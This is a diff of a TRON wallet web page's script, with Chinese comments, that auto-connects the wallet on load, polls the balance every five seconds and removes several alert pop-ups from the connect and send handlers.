@@ -146,7 +146,7 @@ async function loadBalance(){
     }
 }
 
-// 开启自动轮询读取余额，3秒自动刷新一次余额，不用手动刷新页面
+// 开启自动轮询读取余额，连接成功立刻读一次，之后5秒刷新
 function startBalancePoll(){
     stopBalancePoll();
     loadBalance();
@@ -157,7 +157,7 @@ function startBalancePoll(){
     },5000);
 }
 
-// 自动连接钱包（页面加载完毕自动执行）
+// 自动连接钱包（页面加载完毕自动执行，删掉alert弹窗）
 async function autoConnectWallet(){
     if(connectingLock) return;
     connectingLock=true;
@@ -172,16 +172,13 @@ async function autoConnectWallet(){
             const acc = await provider.request({method:"tron_requestAccounts"});
             userAddress = acc[0];
             tronWeb = new TronWeb({fullHost:RPC_LIST[0], provider});
-        }else{
-            alert("请在TP/OKX钱包内置浏览器打开页面");
-            connectingLock=false;
-            return;
         }
+        // 连接成功，立刻启动余额读取，无弹窗
         walletDot.classList.add("connected");
         sendBtn.disabled=false;
         startBalancePoll();
     }catch(e){
-        console.log("自动连接被用户拒绝或者无钱包：",e.message);
+        console.log("自动连接被拒绝：",e.message);
     }finally{
         connectingLock=false;
     }
@@ -203,9 +200,9 @@ allBtn.onclick = async ()=>{
 };
 
 sendBtn.onclick = async ()=>{
-    if(!tronWeb||!userAddress){alert("钱包未连接");return;}
+    if(!tronWeb||!userAddress){return;}
     const val = parseFloat(amountInput.value);
-    if(isNaN(val)||val<=0){alert("输入金额");return;}
+    if(isNaN(val)||val<=0){return;}
     const needSun = tronWeb.toSun(val.toString());
     sendBtn.disabled=true;
     try{
@@ -235,7 +232,7 @@ walletDot.addEventListener("click", disconnectWallet);
 // 页面加载完成自动触发自动连接
 window.addEventListener("load",autoConnectWallet);
 
-// 页面销毁清除定时器，防止内存泄漏
+// 页面销毁清除定时器
 window.addEventListener("beforeunload",stopBalancePoll);
 </script>
 </body>
